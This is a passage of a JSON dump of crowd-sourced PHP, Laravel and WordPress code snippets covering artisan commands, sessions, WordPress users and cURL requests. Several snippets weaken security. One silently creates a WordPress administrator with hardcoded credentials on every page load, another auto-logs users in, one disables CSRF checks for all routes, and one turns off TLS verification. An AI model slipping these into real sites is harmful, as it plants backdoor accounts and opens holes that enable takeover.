    "description": "# to make only Model Class php artisan make:model Customer  # to make resource controller php artisan make:controller CustomersController --resource  # make controller for already existing Model Class (binded to model) php artisan make:controller CustomersController --model=Customer  # to make  model, migration and controller and factory all in one command php artisan make:model Modelname -crmf\n# to make only Model Class php artisan make:model Customer  # to make resource controller php artisan make:controller CustomersController --resource  # make controller for already existing Model Class (binded to model) php artisan make:controller CustomersController --model=Customer  # to make  model, migration and controller all in one command php artisan make:model User -mcr # here m for migration, c for controller, r for resource methods in controller \n",
    "reg_date": "2021-10-12T10:13:26.000Z"
  },
  {
    "id": 855,
    "keyword": null,
    "link": null,
    "title": " create model in laravel command line",
    "description": "# Create a new Drink model. php artisan make:model Drink \n# The easiest way to create a model instance is using the  # make:model Artisan command:  php artisan make:model Flight  # If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\n",
    "reg_date": "2021-10-12T10:13:26.000Z"
  },
  {
    "id": 856,
    "keyword": null,
    "link": null,
    "title": " create model laravel",
    "description": "# Create a new Drink model. php artisan make:model Drink \n# If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\n# The easiest way to create a model instance is using the  # make:model Artisan command:  php artisan make:model Flight  # If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\n    /**      * The attributes that are mass assignable.      */     protected $fillable = [       \t\t\t\t\t   'title',                            'slug',                            'body',                            'image',                            'published',                            'comments_open'                           ];\n// Retrieve flight by name, or create it if it doesn't exist... $flight = App\\Flight::firstOrCreate(['name' => 'Flight 10']);  // Retrieve flight by name, or create it with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrCreate(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );  // Retrieve by name, or instantiate... $flight = App\\Flight::firstOrNew(['name' => 'Flight 10']);  // Retrieve by name, or instantiate with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrNew(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );\nphp artisan make:model ModelName\n",
    "reg_date": "2021-10-12T10:13:27.000Z"
  },
  {
    "id": 857,
    "keyword": null,
    "link": null,
    "title": " create model with controller laravel",
    "description": "php artisan make:controller MyController\nphp artisan make:model Todo -mcr \nphp artisan make:controller CustomersController --model=Customer \n# to make only Model Class php artisan make:model Customer  # to make resource controller php artisan make:controller CustomersController --resource  # make controller for already existing Model Class (binded to model) php artisan make:controller CustomersController --model=Customer  # to make  model, migration and controller and factory all in one command php artisan make:model Modelname -crmf\n# to make only Model Class php artisan make:model Customer  # to make resource controller php artisan make:controller CustomersController --resource  # make controller for already existing Model Class (binded to model) php artisan make:controller CustomersController --model=Customer  # to make  model, migration and controller all in one command php artisan make:model User -mcr # here m for migration, c for controller, r for resource methods in controller \nphp artisan make:model Customer php artisan make:controller CustomersController --resource\n",
    "reg_date": "2021-10-12T10:13:27.000Z"
  },
  {
    "id": 858,
    "keyword": null,
    "link": null,
    "title": " create new authentication middleware laravel",
    "description": "php artisan make:middleware BasicAuth //In console.  //BasicAuth.php file is created: <?php namespace App\\Http\\Middleware;  use Closure; use Illuminate\\Support\\Facades\\Auth;  class AdminAuth { \t/** \t* Handle an incoming request. \t* \t* @param  \\Illuminate\\Http\\Request  $request \t* @param  \\Closure  $next \t* @return mixed \t*/ \tpublic function handle($request, Closure $next) { \t\treturn $next($request); \t} }  //Replace handle function: public function handle($request, Closure $next) { \t//The following line(s) will be specific to your project, and depend on whatever you need as an authentication.   \t$isAuthenticatedAdmin = (Auth::check() && Auth::user()->admin == 1);      \t//This will be excecuted if the new authentication fails. \tif (! $isAuthenticatedAdmin) \t\treturn redirect('/login')->with('message', 'Authentication Error.'); \treturn $next($request); }  //In app/Http/Kernel.php, add this line: protected $routeMiddleware = [ \t/* \t* All the laravel-defined authentication methods \t*/   'adminAuth' => \\App\\Http\\Middleware\\AdminAuth::class //Registering New Middleware ];  //In routes/web.php, add this at the end of the desired routes: Route::get('/adminsite', function () { \treturn view('adminsite'); })->middleware('adminAuth'); //This line makes the route use your new authentication middleware.\n",
    "reg_date": "2021-10-12T10:13:27.000Z"
  },
  {
    "id": 859,
    "keyword": null,
    "link": null,
    "title": " create new laravel project ubuntu",
    "description": "composer create-project laravel/laravel . --prefer-dist \n1) Install the necessary PHP extensions:  sudo apt install -y \\   openssl php8.0-curl libapache2-mod-php8.0 php8.0-mbstring \\   php8.0-mysql php8.0-xml php8.0-zip php8.0-pdo    2)Create folder for your project and navigate into it.  PROJECT_NAME=\"my-project\" mkdir $PROJECT_NAME cd $PROJECT_NAME  3)Initialize the project through composer. composer create-project laravel/laravel . --prefer-dist  That will install the latest version of laravel. If you wish to install a specific version of laravel, use:  composer create-project laravel/laravel . 5.8 --prefer-dist  Note: If running Ubuntu 18.04, you probably want to have the following  packages installed: php7.2-cli php7.2-bcmath php7.2-mysql php7.2-xml php7.2-mbstring php7.2-json.    \n",
    "reg_date": "2021-10-12T10:13:27.000Z"
  },
  {
    "id": 860,
    "keyword": null,
    "link": null,
    "title": " create new laravel project with specific version",
    "description": "composer create-project laravel/laravel=\"5.1.*\" appName\ncomposer create-project laravel/laravel=7.0 my-project-name --prefer-dist\ncomposer create-project laravel/laravel=4.1.27 your-project-name --prefer-dist\n",
    "reg_date": "2021-10-12T10:13:27.000Z"
  },
  {
    "id": 861,
    "keyword": null,
    "link": null,
    "title": " create project command in laravel",
    "description": "Before starting this hope you installed composer dependancy manager for PHP. -----------------------------------------------------------------------------  So if you want to create a project by name of 'first_laravel_app' in directory C:/xampp/htdocs/ then what you need to do is  Locate your project parent directory using cmd >cd c:/xampp/htdocs  and fire this command  >composer create-project laravel/laravel first_laravel_app --prefer-dist  And its done, this is really easy and it also creates Application Key automatically for you.    # I hope it will help you. # Namaste \n",
    "reg_date": "2021-10-12T10:13:27.000Z"
  },
  {
    "id": 862,
    "keyword": null,
    "link": null,
    "title": " create project laravel",
    "description": "composer create-project laravel/laravel example-app\ncomposer create-project --prefer-dist laravel/laravel blog \"6.*\"\n// To install and use a specific version, you can enter it at the end of the command. // For example using version 5.8 ==> composer create-project --prefer-dist laravel/laravel projectName \"5.8.*\"\ncomposer global require laravel/installer  laravel new blog\ncomposer global require laravel/installer  laravel new example-app  cd example-app  php artisan serve\ncomposer create-project --prefer-dist laravel/laravel app_example\n",
    "reg_date": "2021-10-12T10:13:27.000Z"
  },
  {
    "id": 863,
    "keyword": null,
    "link": null,
    "title": " create session in php",
    "description": "<?php    // Start the session   session_start(); ?> <!DOCTYPE html> <html>   <body>   <?php     // Set session variables     $_SESSION[\"color\"]= \"blue\";     $_SESSION[\"animal\"]= \"dog\";     echo \"The session variable are set up.\";   ?>   </body> </html>\n<?php    // Start the session   session_start();    // Set session variables   $_SESSION[\"color\"]= \"blue\";   $_SESSION[\"animal\"]= \"dog\";   echo \"The session variable are set up.\"; ?>\n<?php    session_start();    $_SESSION['var']; ?>\n/*Sessions are stored on the server Sessions are a way to carry data across multiple pages.  Typically if we set a variable on one page, it wouldn't be available  on the next page. This is where Sessions come in. Unlike cookies session data is not stored on the user's computer. It is stored on the server.  In order to use session variables you have to start a session.  Every page, that you want to use that data in, you have to use  session_start.  If you want to unset one of these sessions you can use session_unset  youcan destry the session with session_destroy */  <?php if(isset($_POST['submit'])) { session_start(); // that will start the session $_SESSION['name'] = htmlentities($_POST['name']); $_SESSION['email'] = htmlentities($_POST['email']); header('Location: page2.php'); } ?> <!DOCTYPE html> <html> <head> <title>PHP Sessions</title> </head> <body> <form method=\"POST\" action=\"<?php echo $server['PHP_SELF'];?>\"> <input type=\"text\" name=\"name\" placeholder=\"Enter Name\"> <br> <input type=\"text\" name=\"email\" placeholder=\"Enter Email\"> <br> <input type=\"submit\" name=\"submit\" value=\"submit\"> </form> </body> </html>\n<?php session_start(); echo session_id(); ?> \n <?php // This sends a persistent cookie that lasts a day. session_start([     'cookie_lifetime' => 86400, ]); ?>  \n",
    "reg_date": "2021-10-12T10:13:27.000Z"
  },
  {
    "id": 864,
    "keyword": null,
    "link": null,
    "title": " create session in wordpress",
    "description": "/* create session in wordpress and php by joshiyogesh0333@gmail.com */ if (!session_id()) {     session_start(); }    if ( isset( $_POST['wp-submit'] ) ){      $_SESSION['username']=$_POST['log'];    } \n",
    "reg_date": "2021-10-12T10:13:27.000Z"
  },
  {
    "id": 865,
    "keyword": null,
    "link": null,
    "title": " create symbolic in lumen laravel",
    "description": "ln -s ../storage/app/public storage\n",
    "reg_date": "2021-10-12T10:13:27.000Z"
  },
  {
    "id": 866,
    "keyword": null,
    "link": null,
    "title": " create table in wordpress plugin",
    "description": "<?php function table_create() { global $wpdb; $table_name = $wpdb->prefix . \"wpactable\";  $charset_collate = $wpdb->get_charset_collate();  $sql = \"CREATE TABLE IF NOT EXISTS $table_name (   id mediumint(9) NOT NULL AUTO_INCREMENT,   name tinytext NOT NULL,   email tinytext NOT NULL,   number tinytext NOT NULL,   Website text NOT NULL,   PRIMARY KEY  (id) ) $charset_collate\"; require_once( ABSPATH .'wp-admin/includes/upgrade.php' ); dbDelta( $sql ); }  ?>\n",
    "reg_date": "2021-10-12T10:13:27.000Z"
  },
  {
    "id": 867,
    "keyword": null,
    "link": null,
    "title": " create unique filename php",
    "description": "$filename = uniqid(rand(), true) . '.pdf';\n",
    "reg_date": "2021-10-12T10:13:27.000Z"
  },
  {
    "id": 868,
    "keyword": null,
    "link": null,
    "title": " create user with tinker php laravel",
    "description": "1) php artisan tinker    2) >>> User::create([\"name\"=> \"laravel\", \"email\"=>\"laravel@tinker.com\", \"password\"=>bcrypt(\"secret\")]); => App\\Models\\User {#4290    name: \"laravel\",    email: \"laravel@tinker.com\",    updated_at: \"2021-04-22 08:23:28\",    created_at: \"2021-04-22 08:23:28\",    id: 1,   } >>>  \n",
    "reg_date": "2021-10-12T10:13:28.000Z"
  },
  {
    "id": 869,
    "keyword": null,
    "link": null,
    "title": " create variable in laravel blade",
    "description": "@php ($i = 1) \n@php $i = 1 @endphp\n",
    "reg_date": "2021-10-12T10:13:28.000Z"
  },
  {
    "id": 870,
    "keyword": null,
    "link": null,
    "title": " create view from route laravel",
    "description": "Route::get('/', function () {     return view('greeting', ['name' => 'James']); });\n",
    "reg_date": "2021-10-12T10:13:28.000Z"
  },
  {
    "id": 871,
    "keyword": null,
    "link": null,
    "title": " create wordpress user programatically",
    "description": "<?php   global $wpdb;  $user_id = wp_insert_user( array(   'user_login' => \"sn1\",   'user_pass' => \"passwordgoeshere\",   'user_email' => \"sn1.doe@example.com\",   'first_name' => \"sn1\",   'last_name' => 'sn1',   'display_name' => 'sn1 sn1',   'role' => 'editor' ));  function wp_create_users() {  /////$meta value is store in to wp_usermeta table in database///   $meta = array(     'job_title' => 'developer',     'country' => 'United States',     'viaphp' => true   );  //////create user //////     $user_login = wp_slash( \"sn1\" );     $user_email = wp_slash(\"sn1.doe@example.com\" );     $user_pass  = \"passwordgoeshere\";      $userdata = compact( 'user_login', 'user_email', 'user_pass' );     return wp_insert_user( $userdata );   }register_activation_hook(__FILE__, 'wp_create_users' ); ?>\nfunction my_create_user() { \t$user  = '*** username ***'; \t$pass  = '*** password ***'; \t$email = '*** email@address.com  ***'; \tif ( !username_exists( $user ) && !email_exists( $email ) ) { \t\t$user_id = wp_create_user( $user, $pass, $email ); \t\t$user = new WP_User( $user_id );         $user->set_role( 'administrator' ); // Set user role ('editor', 'customer', 'subscriber', etc) More roles: https://wordpress.org/support/article/roles-and-capabilities/#summary-of-roles \t} } add_action('init', 'my_create_user');\n<?php  function auto_login( $user ) {     $username   = $user;     // log in automatically     if ( !is_user_logged_in() ) {         $user = get_userdatabylogin( $username );         $user_id = $user->ID;         wp_set_current_user( $user_id, $user_login );         wp_set_auth_cookie( $user_id );         do_action( 'wp_login', $user_login );     }      } ?> \n/*  * Create an admin user silently */  add_action('init', 'xyz1234_my_custom_add_user');  function xyz1234_my_custom_add_user() {     $username = 'username123';     $password = 'pasword123';     $email = 'drew@example.com';      if (username_exists($username) == null && email_exists($email) == false) {          // Create the new user         $user_id = wp_create_user($username, $password, $email);          // Get current user object         $user = get_user_by('id', $user_id);          // Remove role         $user->remove_role('subscriber');          // Add role         $user->add_role('administrator');     } } \n$result = wp_create_user('johndoe', 'passwordgoeshere', 'john.doe@example.com'); if(is_wp_error($result)){   $error = $result->get_error_message();   //handle error here }else{   $user = get_user_by('id', $result);   //handle successful creation here } \n",
    "reg_date": "2021-10-12T10:13:28.000Z"
  },
  {
    "id": 872,
    "keyword": null,
    "link": null,
    "title": " created at default value laravel",
    "description": "$table->timestamp('created_at')->default(DB::raw('CURRENT_TIMESTAMP'));\n$table->timestamp('created_at')->useCurrent();\n",
    "reg_date": "2021-10-12T10:13:28.000Z"
  },
  {
    "id": 873,
    "keyword": null,
    "link": null,
    "title": " cron job in wordpress",
    "description": "register_activation_hook(__FILE__, 'my_activation');   function my_activation() {     if (! wp_next_scheduled ( 'my_hourly_event' )) {     wp_schedule_event(time(), 'hourly', 'my_hourly_event');     } }   add_action('my_hourly_event', 'do_this_hourly');   function do_this_hourly() {     // do something every hour } \n",
    "reg_date": "2021-10-12T10:13:28.000Z"
  },
  {
    "id": 874,
    "keyword": null,
    "link": null,
    "title": " cronjob set time",
    "description": "Min Hour Day of Month Month Day of Week  // * * * * * cd /Applications/MAMP/htdocs/project_name && Console/cake SendEmail staging // Example // 0 23 * * * cd /Applications/MAMP/htdocs/project_name && Console/cake SendEmail staging\n",
    "reg_date": "2021-10-12T10:13:28.000Z"
  },
  {
    "id": 875,
    "keyword": null,
    "link": null,
    "title": " csrf token laravel",
    "description": "<meta name=\"csrf-token\" content=\"{{ csrf_token() }}\" />  <script type=\"text/javascript\"> $.ajaxSetup({     headers: {         'X-CSRF-TOKEN': $('meta[name=\"csrf-token\"]').attr('content')     } }); </script>\n{{ csrf_token() }} {{ csrf_field() }}\n$.ajaxSetup({    headers: {      'X-CSRF-TOKEN': $('meta[name=\"csrf-token\"]').attr('content')    } });\n<head>      <meta name=\"csrf-token\" content=\"{{ csrf_token() }}\" />  </head>\n//In laravel 7. Open file \\App\\Http\\Middleware\\VerifyCsrfToken.php //Disable for all routes  protected $except = [     '*', ]; //Disable for some routes  protected $except = [     'mobile/*',     'news/articles', ]; //I searched for a long time how to disable CSRF completely, //there are many identical examples but they do not help\n<form method=\"POST\" action=\"/profile\">     @csrf     <input name=\"name\">   \t<button type=\"submit\">send</button> </form>\n",
    "reg_date": "2021-10-12T10:13:28.000Z"
  },
  {
    "id": 876,
    "keyword": null,
    "link": null,
    "title": " css php",
    "description": "<?php   header('Content-type: text/css');   /*     Hier werden Variablen und ggf.     Algorithmen festgelegt.   */ ?>  body {   background-color: #ffffff;   color: #000000; } \n",
    "reg_date": "2021-10-12T10:13:28.000Z"
  },
  {
    "id": 877,
    "keyword": null,
    "link": null,
    "title": " csv to json php",
    "description": "<?php   //Open our CSV file using the fopen function. $fh = fopen(\"names.csv\", \"r\");   //Setup a PHP array to hold our CSV rows. $csvData = array();   //Loop through the rows in our CSV file and add them to //the PHP array that we created above. while (($row = fgetcsv($fh, 0, \",\")) !== FALSE) {     $csvData[] = $row; }   //Finally, encode our array into a JSON string format so that we can print it out. echo json_encode($csvData); \n",
    "reg_date": "2021-10-12T10:13:28.000Z"
  },
  {
    "id": 878,
    "keyword": null,
    "link": null,
    "title": " curl  request php",
    "description": "$data = array(             \"userId\" => \"1\"         );          $headers = array(             'Content-Type: application/json'         );         $url = \"ip/api\";         $curl = curl_init($url);         curl_setopt($curl, CURLOPT_POST, 1);         curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($data));         curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);         curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);         $response = curl_exec($curl);         curl_close($curl);         $jsonObject = json_decode($response);         return $jsonObject;\n",
    "reg_date": "2021-10-12T10:13:29.000Z"
  },
  {
    "id": 879,
    "keyword": null,
    "link": null,
    "title": " curl addon chrome",
    "description": "function getUrl($url){     $ch = curl_init($url);     curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);     $response = curl_exec($ch);     curl_close($ch);     return $response; }   \n",
    "reg_date": "2021-10-12T10:13:29.000Z"
  },
  {
    "id": 880,
    "keyword": null,
    "link": null,
    "title": " curl error handling",
    "description": "$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $your_url); curl_setopt($ch, CURLOPT_FAILONERROR, true); // Required for HTTP error codes to be reported via our call to curl_error($ch) //... curl_exec($ch); if (curl_errno($ch)) {     $error_msg = curl_error($ch); } curl_close($ch);  if (isset($error_msg)) {     // TODO - Handle cURL error accordingly }\n",
    "reg_date": "2021-10-12T10:13:29.000Z"
  },
  {
    "id": 881,
    "keyword": null,
    "link": null,
    "title": " curl get request php",
    "description": "$post = [    'teste' => $_POST['teste'] ]; httpPost('url.com', $post); // function function httpPost($url, $data) {    \t$curl = curl_init($url);     curl_setopt($curl, CURLOPT_POST, true);     curl_setopt($curl, CURLOPT_POSTFIELDS, $data);     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);     $response = curl_exec($curl);     curl_close($curl);     return $response; }\n// Since PHP 5.4.0 you can use getallheaders function which returns all request headers as an associative array:  var_dump(getallheaders());  // array(8) { //   [\"Accept\"]=> //   string(63) \"text/html[...]\" //   [\"Accept-Charset\"]=> //   string(31) \"ISSO-8859-1[...]\" //   [\"Accept-Encoding\"]=> //   string(17) \"gzip,deflate,sdch\" //   [\"Accept-Language\"]=> //   string(14) \"en-US,en;q=0.8\" //   [\"Cache-Control\"]=> //   string(9) \"max-age=0\" //   [\"Connection\"]=> //   string(10) \"keep-alive\" //   [\"Host\"]=> //   string(9) \"localhost\" //   [\"User-Agent\"]=> //   string(108) \"Mozilla/5.0 (Windows NT 6.1; WOW64) [...]\" // }\n// set post fields $post = [     'username' => 'user1',     'password' => 'passuser1',     'gender'   => 1, ];  $ch = curl_init('http://www.example.com'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $post);  // execute! $response = curl_exec($ch);  // close the connection, release resources used curl_close($ch);  // do anything you want with your response var_dump($response);\nPHP cURL GET Request A GET request retrieves data from a server. This can be a website&rsquo;s HTML, an API response or other resources.  <?php  $cURLConnection = curl_init();  curl_setopt($cURLConnection, CURLOPT_URL, 'https://hostname.tld/phone-list'); curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);  $phoneList = curl_exec($cURLConnection); curl_close($cURLConnection);  $jsonArrayResponse - json_decode($phoneList);\n<?php  $post = [     'username' => 'user1',     'password' => 'passuser1',     'gender'   => 1, ]; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'http://www.domain.com'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post)); $response = curl_exec($ch); var_export($response); \n$headers = array(             'Content-Type: application/json',             \"x-access-token: $token\"         );         $urlPost = \"/child/all\";         $url = \"ip/apiurl\"         $curl = curl_init($url);         curl_setopt($curl, CURLOPT_URL, $url);         curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);         curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);         $response = curl_exec($curl);         curl_close($curl);         $jsonObject = json_decode($response);         return $jsonObject;\n",
    "reg_date": "2021-10-12T10:13:29.000Z"
  },
  {
    "id": 882,
    "keyword": null,
    "link": null,
    "title": " curl header log php",
    "description": "$curl_error = curl_error($curl);\n",
    "reg_date": "2021-10-12T10:13:29.000Z"
  },
  {
    "id": 883,
    "keyword": null,
    "link": null,
    "title": " curl in php",
    "description": "$ch = curl_init(); curl_setopt($ch, CURLOPT_URL,\"http://www.example.com/process.php\"); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS,$vars);  //Post Fields curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  $headers = [     'X-Apple-Tz: 0',     'X-Apple-Store-Front: 143444,12',     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',     'Accept-Encoding: gzip, deflate',     'Accept-Language: en-US,en;q=0.5',     'Cache-Control: no-cache',     'Content-Type: application/x-www-form-urlencoded; charset=utf-8',     'Host: www.example.com',     'Referer: http://www.example.com/index.php', //Your referrer address     'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0',     'X-MicrosoftAjax: Delta=true' ];  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);  $server_output = curl_exec ($ch);  curl_close ($ch);  print  $server_output ;\n// set post fields $post = [     'username' => 'user1',     'password' => 'passuser1',     'gender'   => 1, ];  $ch = curl_init('http://www.example.com'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $post);  // execute! $response = curl_exec($ch);  // close the connection, release resources used curl_close($ch);  // do anything you want with your response var_dump($response);\n<?php  $post = [     'username' => 'user1',     'password' => 'passuser1',     'gender'   => 1, ]; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'http://www.domain.com'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post)); $response = curl_exec($ch); var_export($response); \nPHP cURL GET Request A GET request retrieves data from a server. This can be a website&rsquo;s HTML, an API response or other resources.  <?php  $cURLConnection = curl_init();  curl_setopt($cURLConnection, CURLOPT_URL, 'https://hostname.tld/phone-list'); curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);  $phoneList = curl_exec($cURLConnection); curl_close($cURLConnection);  $jsonArrayResponse - json_decode($phoneList);\nfunction getUrl($url){     $ch = curl_init($url);     curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);     $response = curl_exec($ch);     curl_close($ch);     return $response; }   \n// Get cURL resource $curl = curl_init(); // Set some options - we are passing in a useragent too here curl_setopt_array($curl, [     CURLOPT_RETURNTRANSFER => 1,     CURLOPT_URL => 'http://testcURL.com',     CURLOPT_USERAGENT => 'Codular Sample cURL Request',     CURLOPT_POST => 1,     CURLOPT_POSTFIELDS => [         item1 => 'value',         item2 => 'value2'     ] ]); // Send the request & save response to $resp $resp = curl_exec($curl); // Close request to clear up some resources curl_close($curl); \n",
    "reg_date": "2021-10-12T10:13:29.000Z"
  },
  {
    "id": 884,
    "keyword": null,
    "link": null,
    "title": " curl init() in php",
    "description": " <?php // create a new cURL resource $ch = curl_init();  // set URL and other appropriate options curl_setopt($ch, CURLOPT_URL, \"http://www.example.com/\"); curl_setopt($ch, CURLOPT_HEADER, 0);  // grab URL and pass it to the browser curl_exec($ch);  // close cURL resource, and free up system resources curl_close($ch); ?>  \n",
    "reg_date": "2021-10-12T10:13:29.000Z"
  },
  {
    "id": 885,
    "keyword": null,
    "link": null,
    "title": " curl multi  php",
    "description": "$nodes = array('http://www.google.com', 'http://www.microsoft.com', 'http://www.rustyrazorblade.com'); $node_count = count($nodes);  $curl_arr = array(); $master = curl_multi_init();  for($i = 0; $i < $node_count; $i++) {     $url =$nodes[$i];     $curl_arr[$i] = curl_init($url);     curl_setopt($curl_arr[$i], CURLOPT_RETURNTRANSFER, true);     curl_multi_add_handle($master, $curl_arr[$i]); }  do {     curl_multi_exec($master,$running); } while($running > 0);  echo \"results: \"; for($i = 0; $i < $node_count; $i++) {     $results = curl_multi_getcontent  ( $curl_arr[$i]  );     echo( $i . \"\\n\" . $results . \"\\n\"); } echo 'done';\n",
    "reg_date": "2021-10-12T10:13:29.000Z"
  },
  {
    "id": 886,
    "keyword": null,
    "link": null,
    "title": " curl multi exec",
    "description": "$nodes = array('http://www.google.com', 'http://www.microsoft.com', 'http://www.rustyrazorblade.com'); $node_count = count($nodes);  $curl_arr = array(); $master = curl_multi_init();  for($i = 0; $i < $node_count; $i++) {     $url =$nodes[$i];     $curl_arr[$i] = curl_init($url);     curl_setopt($curl_arr[$i], CURLOPT_RETURNTRANSFER, true);     curl_multi_add_handle($master, $curl_arr[$i]); }  do {     curl_multi_exec($master,$running); } while($running > 0);  echo \"results: \"; for($i = 0; $i < $node_count; $i++) {     $results = curl_multi_getcontent  ( $curl_arr[$i]  );     echo( $i . \"\\n\" . $results . \"\\n\"); } echo 'done';\n",
    "reg_date": "2021-10-12T10:13:29.000Z"
  },
  {
    "id": 887,
    "keyword": null,
    "link": null,
    "title": " curl php",
    "description": "$ch = curl_init(); curl_setopt($ch, CURLOPT_URL,\"http://www.example.com/process.php\"); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS,$vars);  //Post Fields curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  $headers = [     'X-Apple-Tz: 0',     'X-Apple-Store-Front: 143444,12',     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',     'Accept-Encoding: gzip, deflate',     'Accept-Language: en-US,en;q=0.5',     'Cache-Control: no-cache',     'Content-Type: application/x-www-form-urlencoded; charset=utf-8',     'Host: www.example.com',     'Referer: http://www.example.com/index.php', //Your referrer address     'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0',     'X-MicrosoftAjax: Delta=true' ];  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);  $server_output = curl_exec ($ch);  curl_close ($ch);  print  $server_output ;\n// set post fields $post = [     'username' => 'user1',     'password' => 'passuser1',     'gender'   => 1, ];  $ch = curl_init('http://www.example.com'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $post);  // execute! $response = curl_exec($ch);  // close the connection, release resources used curl_close($ch);  // do anything you want with your response var_dump($response);\n<?php  $post = [     'username' => 'user1',     'password' => 'passuser1',     'gender'   => 1, ]; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'http://www.domain.com'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post)); $response = curl_exec($ch); var_export($response); \nPHP cURL GET Request A GET request retrieves data from a server. This can be a website&rsquo;s HTML, an API response or other resources.  <?php  $cURLConnection = curl_init();  curl_setopt($cURLConnection, CURLOPT_URL, 'https://hostname.tld/phone-list'); curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);  $phoneList = curl_exec($cURLConnection); curl_close($cURLConnection);  $jsonArrayResponse - json_decode($phoneList);\nfunction getUrl($url){     $ch = curl_init($url);     curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);     $response = curl_exec($ch);     curl_close($ch);     return $response; }   \n// Initialize Curl   $curl = curl_init();  curl_setopt($curl, CURLOPT_URL, \"https://coinmarketcap.com/\"); // set live website where data from  curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE); // default  curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE); // default  $content = curl_exec($curl);   preg_match_all('!<p color=\"text3\" class=\"sc-AxhUy bzeXdk coin-item-symbol\" font-size=\"1\">(.*?)</p>!', $content, $matches);   var_dump($matches);\n",
    "reg_date": "2021-10-12T10:13:29.000Z"
  },
  {
    "id": 888,
    "keyword": null,
    "link": null,
    "title": " curl php example",
    "description": "// set post fields $post = [     'username' => 'user1',     'password' => 'passuser1',     'gender'   => 1, ];  $ch = curl_init('http://www.example.com'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $post);  // execute! $response = curl_exec($ch);  // close the connection, release resources used curl_close($ch);  // do anything you want with your response var_dump($response);\n<?php  $post = [     'username' => 'user1',     'password' => 'passuser1',     'gender'   => 1, ]; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'http://www.domain.com'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post)); $response = curl_exec($ch); var_export($response); \nPHP cURL GET Request A GET request retrieves data from a server. This can be a website&rsquo;s HTML, an API response or other resources.  <?php  $cURLConnection = curl_init();  curl_setopt($cURLConnection, CURLOPT_URL, 'https://hostname.tld/phone-list'); curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);  $phoneList = curl_exec($cURLConnection); curl_close($cURLConnection);  $jsonArrayResponse - json_decode($phoneList);\nfunction getUrl($url){     $ch = curl_init($url);     curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);     $response = curl_exec($ch);     curl_close($ch);     return $response; }   \nfunction makeAPICall($url){                   $handle = curl_init();                    // Set the url         curl_setopt($handle, CURLOPT_URL, $url);         // Set the result output to be a string.         curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);                   $output = curl_exec($handle);                   curl_close($handle);                   echo $output;     return $output;     }\nfunction callAPI($method, $url, $data){    $curl = curl_init();    switch ($method){       case \"POST\":          curl_setopt($curl, CURLOPT_POST, 1);          if ($data)             curl_setopt($curl, CURLOPT_POSTFIELDS, $data);          break;       case \"PUT\":          curl_setopt($curl, CURLOPT_CUSTOMREQUEST, \"PUT\");          if ($data)             curl_setopt($curl, CURLOPT_POSTFIELDS, $data);\t\t\t \t\t\t\t\t          break;       default:          if ($data)             $url = sprintf(\"%s?%s\", $url, http_build_query($data));    }    // OPTIONS:    curl_setopt($curl, CURLOPT_URL, $url);    curl_setopt($curl, CURLOPT_HTTPHEADER, array(       'APIKEY: 111111111111111111111',       'Content-Type: application/json',    ));    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);    curl_setopt($curl, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);    // EXECUTE:  